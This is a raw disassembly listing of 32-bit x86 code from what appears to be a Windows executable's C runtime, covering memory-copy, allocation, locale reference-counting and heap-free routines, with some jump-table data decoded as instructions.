  426198:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42619c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4261a0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4261a4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4261a8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4261ac:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4261b0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4261b4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4261b8:	lea    eax,[ecx*4+0x0]
  4261bf:	add    esi,eax
  4261c1:	add    edi,eax
  4261c3:	jmp    DWORD PTR [edx*4+0x4261cc]
  4261ca:	mov    edi,edi
  4261cc:	fsub   QWORD PTR [ecx+0x42]
  4261cf:	add    ah,ah
  4261d1:	popa   
  4261d2:	inc    edx
  4261d3:	add    al,dh
  4261d5:	popa   
  4261d6:	inc    edx
  4261d7:	add    BYTE PTR [edx+eiz*2],al
  4261da:	inc    edx
  4261db:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4261e1:	leave  
  4261e2:	ret    
  4261e3:	nop
  4261e4:	mov    al,BYTE PTR [esi]
  4261e6:	mov    BYTE PTR [edi],al
  4261e8:	mov    eax,DWORD PTR [ebp+0x8]
  4261eb:	pop    esi
  4261ec:	pop    edi
  4261ed:	leave  
  4261ee:	ret    
  4261ef:	nop
  4261f0:	mov    al,BYTE PTR [esi]
  4261f2:	mov    BYTE PTR [edi],al
  4261f4:	mov    al,BYTE PTR [esi+0x1]
  4261f7:	mov    BYTE PTR [edi+0x1],al
  4261fa:	mov    eax,DWORD PTR [ebp+0x8]
  4261fd:	pop    esi
  4261fe:	pop    edi
  4261ff:	leave  
  426200:	ret    
  426201:	lea    ecx,[ecx+0x0]
  426204:	mov    al,BYTE PTR [esi]
  426206:	mov    BYTE PTR [edi],al
  426208:	mov    al,BYTE PTR [esi+0x1]
  42620b:	mov    BYTE PTR [edi+0x1],al
  42620e:	mov    al,BYTE PTR [esi+0x2]
  426211:	mov    BYTE PTR [edi+0x2],al
  426214:	mov    eax,DWORD PTR [ebp+0x8]
  426217:	pop    esi
  426218:	pop    edi
  426219:	leave  
  42621a:	ret    
  42621b:	nop
  42621c:	lea    esi,[ecx+esi*1-0x4]
  426220:	lea    edi,[ecx+edi*1-0x4]
  426224:	test   edi,0x3
  42622a:	jne    0x426250
  42622c:	shr    ecx,0x2
  42622f:	and    edx,0x3
  426232:	cmp    ecx,0x8
  426235:	jb     0x426244
  426237:	std    
  426238:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42623a:	cld    
  42623b:	jmp    DWORD PTR [edx*4+0x426368]
  426242:	mov    edi,edi
  426244:	neg    ecx
  426246:	jmp    DWORD PTR [ecx*4+0x426318]
  42624d:	lea    ecx,[ecx+0x0]
  426250:	mov    eax,edi
  426252:	mov    edx,0x3
  426257:	cmp    ecx,0x4
  42625a:	jb     0x426268
  42625c:	and    eax,0x3
  42625f:	sub    ecx,eax
  426261:	jmp    DWORD PTR [eax*4+0x42626c]
  426268:	jmp    DWORD PTR [ecx*4+0x426368]
  42626f:	nop
  426270:	jl     0x4262d4
  426272:	inc    edx
  426273:	add    BYTE PTR [eax-0x37ffbd9e],ah
  426279:	bound  eax,QWORD PTR [edx+0x0]
  42627c:	mov    al,BYTE PTR [esi+0x3]
  42627f:	and    edx,ecx
  426281:	mov    BYTE PTR [edi+0x3],al
  426284:	sub    esi,0x1
  426287:	shr    ecx,0x2
  42628a:	sub    edi,0x1
  42628d:	cmp    ecx,0x8
  426290:	jb     0x426244
  426292:	std    
  426293:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426295:	cld    
  426296:	jmp    DWORD PTR [edx*4+0x426368]
  42629d:	lea    ecx,[ecx+0x0]
  4262a0:	mov    al,BYTE PTR [esi+0x3]
  4262a3:	and    edx,ecx
  4262a5:	mov    BYTE PTR [edi+0x3],al
  4262a8:	mov    al,BYTE PTR [esi+0x2]
  4262ab:	shr    ecx,0x2
  4262ae:	mov    BYTE PTR [edi+0x2],al
  4262b1:	sub    esi,0x2
  4262b4:	sub    edi,0x2
  4262b7:	cmp    ecx,0x8
  4262ba:	jb     0x426244
  4262bc:	std    
  4262bd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262bf:	cld    
  4262c0:	jmp    DWORD PTR [edx*4+0x426368]
  4262c7:	nop
  4262c8:	mov    al,BYTE PTR [esi+0x3]
  4262cb:	and    edx,ecx
  4262cd:	mov    BYTE PTR [edi+0x3],al
  4262d0:	mov    al,BYTE PTR [esi+0x2]
  4262d3:	mov    BYTE PTR [edi+0x2],al
  4262d6:	mov    al,BYTE PTR [esi+0x1]
  4262d9:	shr    ecx,0x2
  4262dc:	mov    BYTE PTR [edi+0x1],al
  4262df:	sub    esi,0x3
  4262e2:	sub    edi,0x3
  4262e5:	cmp    ecx,0x8
  4262e8:	jb     0x426244
  4262ee:	std    
  4262ef:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262f1:	cld    
  4262f2:	jmp    DWORD PTR [edx*4+0x426368]
  4262f9:	lea    ecx,[ecx+0x0]
  4262fc:	sbb    al,0x63
  4262fe:	inc    edx
  4262ff:	add    BYTE PTR [ebx+eiz*2],ah
  426302:	inc    edx
  426303:	add    BYTE PTR [ebx+eiz*2],ch
  426306:	inc    edx
  426307:	add    BYTE PTR [ebx+eiz*2],dh
  42630a:	inc    edx
  42630b:	add    BYTE PTR [ebx+eiz*2],bh
  42630e:	inc    edx
  42630f:	add    BYTE PTR [ebx+eiz*2+0x42],al
  426313:	add    BYTE PTR [ebx+eiz*2+0x42],cl
  426317:	add    BYTE PTR [edi+0x63],bl
  42631a:	inc    edx
  42631b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426321:	inc    esp
  426322:	(bad)  
  426323:	sbb    al,0x8b
  426325:	inc    esp
  426326:	mov    ds,WORD PTR [eax]
  426328:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42632c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426330:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426334:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426338:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42633c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426340:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426344:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426348:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42634c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426350:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426354:	lea    eax,[ecx*4+0x0]
  42635b:	add    esi,eax
  42635d:	add    edi,eax
  42635f:	jmp    DWORD PTR [edx*4+0x426368]
  426366:	mov    edi,edi
  426368:	js     0x4263cd
  42636a:	inc    edx
  42636b:	add    BYTE PTR [eax-0x6fffbd9d],al
  426371:	arpl   WORD PTR [edx+0x0],ax
  426374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426375:	arpl   WORD PTR [edx+0x0],ax
  426378:	mov    eax,DWORD PTR [ebp+0x8]
  42637b:	pop    esi
  42637c:	pop    edi
  42637d:	leave  
  42637e:	ret    
  42637f:	nop
  426380:	mov    al,BYTE PTR [esi+0x3]
  426383:	mov    BYTE PTR [edi+0x3],al
  426386:	mov    eax,DWORD PTR [ebp+0x8]
  426389:	pop    esi
  42638a:	pop    edi
  42638b:	leave  
  42638c:	ret    
  42638d:	lea    ecx,[ecx+0x0]
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	mov    BYTE PTR [edi+0x3],al
  426396:	mov    al,BYTE PTR [esi+0x2]
  426399:	mov    BYTE PTR [edi+0x2],al
  42639c:	mov    eax,DWORD PTR [ebp+0x8]
  42639f:	pop    esi
  4263a0:	pop    edi
  4263a1:	leave  
  4263a2:	ret    
  4263a3:	nop
  4263a4:	mov    al,BYTE PTR [esi+0x3]
  4263a7:	mov    BYTE PTR [edi+0x3],al
  4263aa:	mov    al,BYTE PTR [esi+0x2]
  4263ad:	mov    BYTE PTR [edi+0x2],al
  4263b0:	mov    al,BYTE PTR [esi+0x1]
  4263b3:	mov    BYTE PTR [edi+0x1],al
  4263b6:	mov    eax,DWORD PTR [ebp+0x8]
  4263b9:	pop    esi
  4263ba:	pop    edi
  4263bb:	leave  
  4263bc:	ret    
  4263bd:	push   DWORD PTR [esp+0x4]
  4263c1:	call   DWORD PTR ds:0x4290c8
  4263c7:	xor    eax,eax
  4263c9:	inc    eax
  4263ca:	ret    0x8
  4263cd:	push   0x10
  4263cf:	push   0x4296c8
  4263d4:	call   0x425340
  4263d9:	mov    eax,ds:0x45dd88
  4263de:	test   eax,eax
  4263e0:	jne    0x426419
  4263e2:	cmp    DWORD PTR ds:0x45dac4,0x1
  4263e9:	je     0x42640f
  4263eb:	push   0x4296b4
  4263f0:	call   DWORD PTR ds:0x429024
  4263f6:	test   eax,eax
  4263f8:	je     0x42640f
  4263fa:	push   0x42968c
  4263ff:	push   eax
  426400:	call   DWORD PTR ds:0x429020
  426406:	mov    ds:0x45dd88,eax
  42640b:	test   eax,eax
  42640d:	jne    0x426419
  42640f:	mov    eax,0x4263bd
  426414:	mov    ds:0x45dd88,eax
  426419:	and    DWORD PTR [ebp-0x4],0x0
  42641d:	push   DWORD PTR [ebp+0xc]
  426420:	push   DWORD PTR [ebp+0x8]
  426423:	call   eax
  426425:	mov    DWORD PTR [ebp-0x1c],eax
  426428:	jmp    0x42644e
  42642a:	mov    eax,DWORD PTR [ebp-0x14]
  42642d:	mov    eax,DWORD PTR [eax]
  42642f:	mov    eax,DWORD PTR [eax]
  426431:	mov    DWORD PTR [ebp-0x20],eax
  426434:	xor    eax,eax
  426436:	inc    eax
  426437:	ret    
  426438:	mov    esp,DWORD PTR [ebp-0x18]
  42643b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426442:	jne    0x42644c
  426444:	push   0x8
  426446:	call   DWORD PTR ds:0x429094
  42644c:	xor    eax,eax
  42644e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426452:	call   0x42537b
  426457:	ret    
  426458:	push   0x10
  42645a:	push   0x4296d8
  42645f:	call   0x425340
  426464:	mov    esi,DWORD PTR [ebp+0x8]
  426467:	imul   esi,DWORD PTR [ebp+0xc]
  42646b:	mov    DWORD PTR [ebp-0x1c],esi
  42646e:	test   esi,esi
  426470:	jne    0x426473
  426472:	inc    esi
  426473:	xor    edi,edi
  426475:	mov    DWORD PTR [ebp-0x20],edi
  426478:	cmp    esi,0xffffffe0
  42647b:	ja     0x4264e2
  42647d:	cmp    DWORD PTR ds:0x45e144,0x3
  426484:	jne    0x4264cd
  426486:	add    esi,0xf
  426489:	and    esi,0xfffffff0
  42648c:	mov    DWORD PTR [ebp+0xc],esi
  42648f:	mov    ebx,DWORD PTR [ebp-0x1c]
  426492:	cmp    ebx,DWORD PTR ds:0x45df04
  426498:	ja     0x4264cd
  42649a:	push   0x4
  42649c:	call   0x4254ff
  4264a1:	pop    ecx
  4264a2:	and    DWORD PTR [ebp-0x4],edi
  4264a5:	push   ebx
  4264a6:	call   0x426f01
  4264ab:	pop    ecx
  4264ac:	mov    DWORD PTR [ebp-0x20],eax
  4264af:	or     DWORD PTR [ebp-0x4],0xffffffff
  4264b3:	call   0x426502
  4264b8:	mov    edi,DWORD PTR [ebp-0x20]
  4264bb:	test   edi,edi
  4264bd:	je     0x4264d1
  4264bf:	push   DWORD PTR [ebp-0x1c]
  4264c2:	push   0x0
  4264c4:	push   edi
  4264c5:	call   0x427c40
  4264ca:	add    esp,0xc
  4264cd:	test   edi,edi
  4264cf:	jne    0x42650b
  4264d1:	push   esi
  4264d2:	push   0x8
  4264d4:	push   DWORD PTR ds:0x45e140
  4264da:	call   DWORD PTR ds:0x429030
  4264e0:	mov    edi,eax
  4264e2:	test   edi,edi
  4264e4:	jne    0x42650b
  4264e6:	cmp    DWORD PTR ds:0x45ddc8,edi
  4264ec:	je     0x42650b
  4264ee:	push   esi
  4264ef:	call   0x427c22
  4264f4:	pop    ecx
  4264f5:	test   eax,eax
  4264f7:	jne    0x426473
  4264fd:	jmp    0x42650d
  4264ff:	mov    esi,DWORD PTR [ebp+0xc]
  426502:	push   0x4
  426504:	call   0x42546b
  426509:	pop    ecx
  42650a:	ret    
  42650b:	mov    eax,edi
  42650d:	call   0x42537b
  426512:	ret    
  426513:	push   esi
  426514:	mov    esi,DWORD PTR [esp+0x8]
  426518:	mov    eax,DWORD PTR [esi+0x3c]
  42651b:	push   edi
  42651c:	xor    edi,edi
  42651e:	cmp    eax,DWORD PTR ds:0x45ddd4
  426524:	je     0x426589
  426526:	cmp    eax,edi
  426528:	je     0x426589
  42652a:	mov    eax,DWORD PTR [esi+0x2c]
  42652d:	cmp    DWORD PTR [eax],edi
  42652f:	jne    0x426589
  426531:	mov    eax,DWORD PTR [esi+0x34]
  426534:	cmp    eax,edi
  426536:	je     0x426554
  426538:	cmp    DWORD PTR [eax],edi
  42653a:	jne    0x426554
  42653c:	cmp    eax,DWORD PTR ds:0x45def0
  426542:	je     0x426554
  426544:	push   eax
  426545:	call   0x425f4a
  42654a:	push   DWORD PTR [esi+0x3c]
  42654d:	call   0x427e8f
  426552:	pop    ecx
  426553:	pop    ecx
  426554:	mov    eax,DWORD PTR [esi+0x30]
  426557:	cmp    eax,edi
  426559:	je     0x426577
  42655b:	cmp    DWORD PTR [eax],edi
  42655d:	jne    0x426577
  42655f:	cmp    eax,DWORD PTR ds:0x45def4
  426565:	je     0x426577
  426567:	push   eax
  426568:	call   0x425f4a
  42656d:	push   DWORD PTR [esi+0x3c]
  426570:	call   0x427e30
  426575:	pop    ecx
  426576:	pop    ecx
  426577:	push   DWORD PTR [esi+0x2c]
  42657a:	call   0x425f4a
  42657f:	push   DWORD PTR [esi+0x3c]
  426582:	call   0x425f4a
  426587:	pop    ecx
  426588:	pop    ecx
  426589:	mov    eax,DWORD PTR [esi+0x40]
  42658c:	cmp    eax,DWORD PTR ds:0x45deec
  426592:	je     0x4265ac
  426594:	cmp    eax,edi
  426596:	je     0x4265ac
  426598:	cmp    DWORD PTR [eax],edi
  42659a:	jne    0x4265ac
  42659c:	push   eax
  42659d:	call   0x425f4a
  4265a2:	push   DWORD PTR [esi+0x44]
  4265a5:	call   0x425f4a
  4265aa:	pop    ecx
  4265ab:	pop    ecx
  4265ac:	mov    eax,DWORD PTR [esi+0x50]
  4265af:	cmp    eax,DWORD PTR ds:0x45ddd0
  4265b5:	je     0x4265d3
  4265b7:	cmp    eax,edi
  4265b9:	je     0x4265d3
  4265bb:	cmp    DWORD PTR [eax+0xb4],edi
  4265c1:	jne    0x4265d3
  4265c3:	push   eax
  4265c4:	call   0x427ca0
  4265c9:	push   DWORD PTR [esi+0x50]
  4265cc:	call   0x425f4a
  4265d1:	pop    ecx
  4265d2:	pop    ecx
  4265d3:	push   esi
  4265d4:	call   0x425f4a
  4265d9:	pop    ecx
  4265da:	pop    edi
  4265db:	pop    esi
  4265dc:	ret    
  4265dd:	push   esi
  4265de:	call   0x4251f3
  4265e3:	mov    esi,eax
  4265e5:	mov    eax,DWORD PTR [esi+0x64]
  4265e8:	cmp    eax,DWORD PTR ds:0x45d58c
  4265ee:	je     0x42669a
  4265f4:	test   eax,eax
  4265f6:	je     0x426627
  4265f8:	mov    ecx,DWORD PTR [eax+0x2c]
  4265fb:	dec    DWORD PTR [eax]
  4265fd:	test   ecx,ecx
  4265ff:	je     0x426603
  426601:	dec    DWORD PTR [ecx]
  426603:	mov    ecx,DWORD PTR [eax+0x34]
  426606:	test   ecx,ecx
  426608:	je     0x42660c
  42660a:	dec    DWORD PTR [ecx]
  42660c:	mov    ecx,DWORD PTR [eax+0x30]
  42660f:	test   ecx,ecx
  426611:	je     0x426615
  426613:	dec    DWORD PTR [ecx]
  426615:	mov    ecx,DWORD PTR [eax+0x40]
  426618:	test   ecx,ecx
  42661a:	je     0x42661e
  42661c:	dec    DWORD PTR [ecx]
  42661e:	mov    ecx,DWORD PTR [eax+0x4c]
  426621:	dec    DWORD PTR [ecx+0xb4]
  426627:	mov    ecx,DWORD PTR ds:0x45d58c
  42662d:	mov    DWORD PTR [esi+0x64],ecx
  426630:	mov    ecx,DWORD PTR ds:0x45d58c
  426636:	inc    DWORD PTR [ecx]
  426638:	mov    ecx,DWORD PTR ds:0x45d58c
  42663e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426641:	test   ecx,ecx
  426643:	je     0x426647
  426645:	inc    DWORD PTR [ecx]
  426647:	mov    ecx,DWORD PTR ds:0x45d58c
  42664d:	mov    ecx,DWORD PTR [ecx+0x34]
  426650:	test   ecx,ecx
  426652:	je     0x426656
  426654:	inc    DWORD PTR [ecx]
  426656:	mov    ecx,DWORD PTR ds:0x45d58c
  42665c:	mov    ecx,DWORD PTR [ecx+0x30]
  42665f:	test   ecx,ecx
  426661:	je     0x426665
  426663:	inc    DWORD PTR [ecx]
  426665:	mov    ecx,DWORD PTR ds:0x45d58c
  42666b:	mov    ecx,DWORD PTR [ecx+0x40]
  42666e:	test   ecx,ecx
  426670:	je     0x426674
  426672:	inc    DWORD PTR [ecx]
  426674:	mov    ecx,DWORD PTR ds:0x45d58c
  42667a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42667d:	inc    DWORD PTR [ecx+0xb4]
  426683:	test   eax,eax
  426685:	je     0x42669a
  426687:	cmp    DWORD PTR [eax],0x0
  42668a:	jne    0x42669a
  42668c:	cmp    eax,0x45d538
  426691:	je     0x42669a
  426693:	push   eax
  426694:	call   0x426513
  426699:	pop    ecx
  42669a:	mov    eax,DWORD PTR [esi+0x64]
  42669d:	pop    esi
  42669e:	ret    
  42669f:	push   0xc
  4266a1:	push   0x429868
  4266a6:	call   0x425340
  4266ab:	push   0xc
  4266ad:	call   0x4254ff
  4266b2:	pop    ecx
  4266b3:	and    DWORD PTR [ebp-0x4],0x0
  4266b7:	call   0x4265dd
  4266bc:	mov    DWORD PTR [ebp-0x1c],eax
  4266bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4266c3:	call   0x4266d1
  4266c8:	mov    eax,DWORD PTR [ebp-0x1c]
  4266cb:	call   0x42537b
  4266d0:	ret    
  4266d1:	push   0xc
  4266d3:	call   0x42546b
  4266d8:	pop    ecx
  4266d9:	ret    
  4266da:	push   0x140
  4266df:	push   0x0
  4266e1:	push   DWORD PTR ds:0x45e140
  4266e7:	call   DWORD PTR ds:0x429030
  4266ed:	test   eax,eax
  4266ef:	mov    ds:0x45df00,eax
  4266f4:	jne    0x4266f7
  4266f6:	ret    
  4266f7:	mov    ecx,DWORD PTR [esp+0x4]
  4266fb:	and    DWORD PTR ds:0x45def8,0x0
  426702:	and    DWORD PTR ds:0x45defc,0x0
  426709:	mov    ds:0x45df08,eax
  42670e:	xor    eax,eax
  426710:	mov    DWORD PTR ds:0x45df04,ecx
  426716:	mov    DWORD PTR ds:0x45df0c,0x10
  426720:	inc    eax
  426721:	ret    
  426722:	mov    eax,ds:0x45defc
  426727:	lea    ecx,[eax+eax*4]
  42672a:	mov    eax,ds:0x45df00
  42672f:	lea    ecx,[eax+ecx*4]
  426732:	jmp    0x426746
  426734:	mov    edx,DWORD PTR [esp+0x4]
  426738:	sub    edx,DWORD PTR [eax+0xc]
  42673b:	cmp    edx,0x100000
  426741:	jb     0x42674c
  426743:	add    eax,0x14
  426746:	cmp    eax,ecx
  426748:	jb     0x426734
  42674a:	xor    eax,eax
  42674c:	ret    
  42674d:	push   ebp
  42674e:	mov    ebp,esp
  426750:	sub    esp,0x10
  426753:	mov    ecx,DWORD PTR [ebp+0x8]
  426756:	mov    eax,DWORD PTR [ecx+0x10]
  426759:	push   esi
  42675a:	mov    esi,DWORD PTR [ebp+0xc]
  42675d:	push   edi
  42675e:	mov    edi,esi
  426760:	sub    edi,DWORD PTR [ecx+0xc]
  426763:	add    esi,0xfffffffc
  426766:	shr    edi,0xf
  426769:	mov    ecx,edi
  42676b:	imul   ecx,ecx,0x204
  426771:	lea    ecx,[ecx+eax*1+0x144]
  426778:	mov    DWORD PTR [ebp-0x10],ecx
  42677b:	mov    ecx,DWORD PTR [esi]
  42677d:	dec    ecx
  42677e:	test   cl,0x1
  426781:	mov    DWORD PTR [ebp-0x4],ecx
  426784:	jne    0x426a61
  42678a:	push   ebx
  42678b:	lea    ebx,[ecx+esi*1]
  42678e:	mov    edx,DWORD PTR [ebx]
  426790:	mov    DWORD PTR [ebp-0xc],edx
  426793:	mov    edx,DWORD PTR [esi-0x4]
  426796:	mov    DWORD PTR [ebp-0x8],edx
  426799:	mov    edx,DWORD PTR [ebp-0xc]
  42679c:	test   dl,0x1
  42679f:	mov    DWORD PTR [ebp+0xc],ebx
  4267a2:	jne    0x426818
  4267a4:	sar    edx,0x4
  4267a7:	dec    edx
  4267a8:	cmp    edx,0x3f
  4267ab:	jbe    0x4267b0
  4267ad:	push   0x3f
  4267af:	pop    edx
  4267b0:	mov    ecx,DWORD PTR [ebx+0x4]
  4267b3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4267b6:	jne    0x4267fa
  4267b8:	cmp    edx,0x20
  4267bb:	mov    ebx,0x80000000
  4267c0:	jae    0x4267db
  4267c2:	mov    ecx,edx
  4267c4:	shr    ebx,cl
  4267c6:	lea    ecx,[edx+eax*1+0x4]
  4267ca:	not    ebx
  4267cc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4267d0:	dec    BYTE PTR [ecx]
  4267d2:	jne    0x4267f7
  4267d4:	mov    ecx,DWORD PTR [ebp+0x8]
  4267d7:	and    DWORD PTR [ecx],ebx
  4267d9:	jmp    0x4267f7
  4267db:	lea    ecx,[edx-0x20]
  4267de:	shr    ebx,cl
  4267e0:	lea    ecx,[edx+eax*1+0x4]
  4267e4:	not    ebx
  4267e6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4267ed:	dec    BYTE PTR [ecx]
  4267ef:	jne    0x4267f7
  4267f1:	mov    ecx,DWORD PTR [ebp+0x8]
  4267f4:	and    DWORD PTR [ecx+0x4],ebx
  4267f7:	mov    ebx,DWORD PTR [ebp+0xc]
  4267fa:	mov    edx,DWORD PTR [ebx+0x8]
  4267fd:	mov    ebx,DWORD PTR [ebx+0x4]
  426800:	mov    ecx,DWORD PTR [ebp-0x4]
  426803:	add    ecx,DWORD PTR [ebp-0xc]
  426806:	mov    DWORD PTR [edx+0x4],ebx
  426809:	mov    edx,DWORD PTR [ebp+0xc]
  42680c:	mov    ebx,DWORD PTR [edx+0x4]
  42680f:	mov    edx,DWORD PTR [edx+0x8]
  426812:	mov    DWORD PTR [ebx+0x8],edx
  426815:	mov    DWORD PTR [ebp-0x4],ecx
  426818:	mov    edx,ecx
  42681a:	sar    edx,0x4
  42681d:	dec    edx
  42681e:	cmp    edx,0x3f
  426821:	jbe    0x426826
  426823:	push   0x3f
  426825:	pop    edx
  426826:	mov    ebx,DWORD PTR [ebp-0x8]
  426829:	and    ebx,0x1
  42682c:	mov    DWORD PTR [ebp-0xc],ebx
  42682f:	jne    0x4268c4
  426835:	sub    esi,DWORD PTR [ebp-0x8]
  426838:	mov    ebx,DWORD PTR [ebp-0x8]
  42683b:	sar    ebx,0x4
  42683e:	push   0x3f
  426840:	mov    DWORD PTR [ebp+0xc],esi
  426843:	dec    ebx
  426844:	pop    esi
  426845:	cmp    ebx,esi
  426847:	jbe    0x42684b
  426849:	mov    ebx,esi
  42684b:	add    ecx,DWORD PTR [ebp-0x8]
  42684e:	mov    edx,ecx
  426850:	sar    edx,0x4
  426853:	dec    edx
  426854:	cmp    edx,esi
  426856:	mov    DWORD PTR [ebp-0x4],ecx
  426859:	jbe    0x42685d
  42685b:	mov    edx,esi
  42685d:	cmp    ebx,edx
  42685f:	je     0x4268bf
  426861:	mov    ecx,DWORD PTR [ebp+0xc]
  426864:	mov    esi,DWORD PTR [ecx+0x4]
  426867:	cmp    esi,DWORD PTR [ecx+0x8]
  42686a:	jne    0x4268a7
  42686c:	cmp    ebx,0x20
  42686f:	mov    esi,0x80000000
  426874:	jae    0x42688d
  426876:	mov    ecx,ebx
  426878:	shr    esi,cl
  42687a:	not    esi
  42687c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426880:	dec    BYTE PTR [ebx+eax*1+0x4]
  426884:	jne    0x4268a7
  426886:	mov    ecx,DWORD PTR [ebp+0x8]
  426889:	and    DWORD PTR [ecx],esi
  42688b:	jmp    0x4268a7
  42688d:	lea    ecx,[ebx-0x20]
  426890:	shr    esi,cl
  426892:	not    esi
  426894:	and    DWORD PTR [eax+edi*4+0xc4],esi
  42689b:	dec    BYTE PTR [ebx+eax*1+0x4]
  42689f:	jne    0x4268a7
  4268a1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268a4:	and    DWORD PTR [ecx+0x4],esi
  4268a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4268aa:	mov    esi,DWORD PTR [ecx+0x8]
  4268ad:	mov    ecx,DWORD PTR [ecx+0x4]
  4268b0:	mov    DWORD PTR [esi+0x4],ecx
  4268b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4268b6:	mov    esi,DWORD PTR [ecx+0x4]
  4268b9:	mov    ecx,DWORD PTR [ecx+0x8]
  4268bc:	mov    DWORD PTR [esi+0x8],ecx
  4268bf:	mov    esi,DWORD PTR [ebp+0xc]
  4268c2:	jmp    0x4268c7
  4268c4:	mov    ebx,DWORD PTR [ebp+0x8]
  4268c7:	cmp    DWORD PTR [ebp-0xc],0x0
  4268cb:	jne    0x4268d5
  4268cd:	cmp    ebx,edx
  4268cf:	je     0x426955
  4268d5:	mov    ecx,DWORD PTR [ebp-0x10]
  4268d8:	lea    ecx,[ecx+edx*8]
  4268db:	mov    ebx,DWORD PTR [ecx+0x4]
  4268de:	mov    DWORD PTR [esi+0x8],ecx
  4268e1:	mov    DWORD PTR [esi+0x4],ebx
  4268e4:	mov    DWORD PTR [ecx+0x4],esi
  4268e7:	mov    ecx,DWORD PTR [esi+0x4]
  4268ea:	mov    DWORD PTR [ecx+0x8],esi
  4268ed:	mov    ecx,DWORD PTR [esi+0x4]
  4268f0:	cmp    ecx,DWORD PTR [esi+0x8]
  4268f3:	jne    0x426955
  4268f5:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  4268f9:	mov    BYTE PTR [ebp+0xf],cl
  4268fc:	inc    cl
  4268fe:	cmp    edx,0x20
  426901:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426905:	jae    0x42692c
  426907:	cmp    BYTE PTR [ebp+0xf],0x0
  42690b:	jne    0x42691b
  42690d:	mov    ecx,edx
  42690f:	mov    ebx,0x80000000
  426914:	shr    ebx,cl
  426916:	mov    ecx,DWORD PTR [ebp+0x8]
  426919:	or     DWORD PTR [ecx],ebx
  42691b:	mov    ebx,0x80000000
  426920:	mov    ecx,edx
  426922:	shr    ebx,cl
  426924:	lea    eax,[eax+edi*4+0x44]
  426928:	or     DWORD PTR [eax],ebx
  42692a:	jmp    0x426955
  42692c:	cmp    BYTE PTR [ebp+0xf],0x0
  426930:	jne    0x426942
  426932:	lea    ecx,[edx-0x20]
  426935:	mov    ebx,0x80000000
  42693a:	shr    ebx,cl
  42693c:	mov    ecx,DWORD PTR [ebp+0x8]
  42693f:	or     DWORD PTR [ecx+0x4],ebx
  426942:	lea    ecx,[edx-0x20]
  426945:	mov    edx,0x80000000
  42694a:	shr    edx,cl
  42694c:	lea    eax,[eax+edi*4+0xc4]
  426953:	or     DWORD PTR [eax],edx
  426955:	mov    eax,DWORD PTR [ebp-0x4]
  426958:	mov    DWORD PTR [esi],eax
  42695a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  42695e:	mov    eax,DWORD PTR [ebp-0x10]
  426961:	dec    DWORD PTR [eax]
  426963:	jne    0x426a60
  426969:	mov    eax,ds:0x45def8
  42696e:	test   eax,eax
  426970:	je     0x426a52
  426976:	mov    ecx,DWORD PTR ds:0x45df10
  42697c:	mov    esi,DWORD PTR ds:0x4290ac
  426982:	push   0x4000
  426987:	shl    ecx,0xf
  42698a:	add    ecx,DWORD PTR [eax+0xc]
  42698d:	mov    ebx,0x8000
  426992:	push   ebx
  426993:	push   ecx
  426994:	call   esi
  426996:	mov    ecx,DWORD PTR ds:0x45df10
  42699c:	mov    eax,ds:0x45def8
  4269a1:	mov    edx,0x80000000
  4269a6:	shr    edx,cl
  4269a8:	or     DWORD PTR [eax+0x8],edx
  4269ab:	mov    eax,ds:0x45def8
  4269b0:	mov    eax,DWORD PTR [eax+0x10]
  4269b3:	mov    ecx,DWORD PTR ds:0x45df10
  4269b9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  4269c1:	mov    eax,ds:0x45def8
  4269c6:	mov    eax,DWORD PTR [eax+0x10]
  4269c9:	dec    BYTE PTR [eax+0x43]
  4269cc:	mov    eax,ds:0x45def8
  4269d1:	mov    ecx,DWORD PTR [eax+0x10]
  4269d4:	cmp    BYTE PTR [ecx+0x43],0x0
  4269d8:	jne    0x4269e3
  4269da:	and    DWORD PTR [eax+0x4],0xfffffffe
  4269de:	mov    eax,ds:0x45def8
  4269e3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  4269e7:	jne    0x426a52
  4269e9:	push   ebx
  4269ea:	push   0x0
  4269ec:	push   DWORD PTR [eax+0xc]
  4269ef:	call   esi
  4269f1:	mov    eax,ds:0x45def8
  4269f6:	push   DWORD PTR [eax+0x10]
  4269f9:	push   0x0
  4269fb:	push   DWORD PTR ds:0x45e140
  426a01:	call   DWORD PTR ds:0x42902c
